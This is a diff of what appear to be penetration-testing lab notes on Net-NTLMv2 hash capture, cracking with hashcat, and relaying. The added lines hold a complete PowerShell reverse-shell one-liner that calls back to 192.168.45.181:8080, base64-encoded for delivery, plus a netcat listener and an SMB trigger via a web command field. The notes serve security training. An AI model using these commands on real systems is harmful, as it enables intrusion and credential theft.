@@ -1600,7 +1600,18 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     - Burp suite - file upload > change file name > \\\\192.168.45.181\\test > listener captured NTLMv2 hash  
     - Kali `nano sam.hash`  
     - `hashcat -m 5600 sam.hash /usr/share/wordlists/rockyou.txt --force` > DISISMYPASSWORD  
-  - Relaying Net-NTLMv2
+  - Relaying Net-NTLMv2 via web
+    - Starting ntlmrelayx for a Relay-attack targeting FILES02
+      ```
+      $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.181",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+      $EncodedText =[Convert]::ToBase64String($Bytes)
+      $EncodedText
+      ```
+    - start netcat listener `nc -nvlp 8080`
+    - Using the dir command to create an SMB connection to our Kali machine
+      `dir \\192.168.45.181\test` in web portal os command  
   - Windows credential guard
 - 16.2.1
 
